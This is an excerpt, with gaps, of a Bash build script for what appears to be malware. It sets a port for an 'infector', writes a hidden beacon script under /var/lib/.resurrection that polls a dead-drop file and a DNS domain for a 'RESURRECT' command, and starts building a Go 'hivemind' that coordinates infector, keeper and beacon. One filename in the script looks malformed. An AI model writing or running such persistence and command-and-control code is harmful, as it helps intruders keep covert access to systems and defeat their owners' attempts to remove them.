...
INFECTOR_PORT="${INFECTOR_PORT:-2223}"   # distinct from Hatter's honeypot on 2222
...
# ------------------------------------------------------------
# 6. Build Bash beacon (checks dead‑drop for resurrection signal)
# ------------------------------------------------------------
build_bash_beacon() {
    cat > /var/lib/.resurrection/beacon.sh << 'BEACON'
#!/bin/bash
RESURRECT_DIR="/var/lib/.resurrection"
DEAD_DROP_URL=file:///var/lib/.sophia/dead_drop_df953e8417a93903.txt
RUN_DIR="/run/purple"
BEACON_INTERVAL=7200
...
while true; do
    ...
    if [[ -z "$signal" ]] && command -v dig &>/dev/null; then
        local dns_domain="${PURPLE_DNS_DROP:-purple-beacon.internal}"
    ...
    if [[ "$signal" == "RESURRECT" ]]; then
        ...
        # Signal to Little John to start resurrection
        touch "$RUN_DIR/resurrection_needed;   "
        
        # Wait for acknowledgement
        for i in {1..30}; do
            if [[ -f "$RUN_DIR/resurrection_acknowledged" ]]; then
                break
            fi
            sleep 1
        done
...
# ------------------------------------------------------------
# 7. Build Go hivemind (orchestrates keeper, infector, beacon)
# ------------------------------------------------------------
build_go_hivemind() {
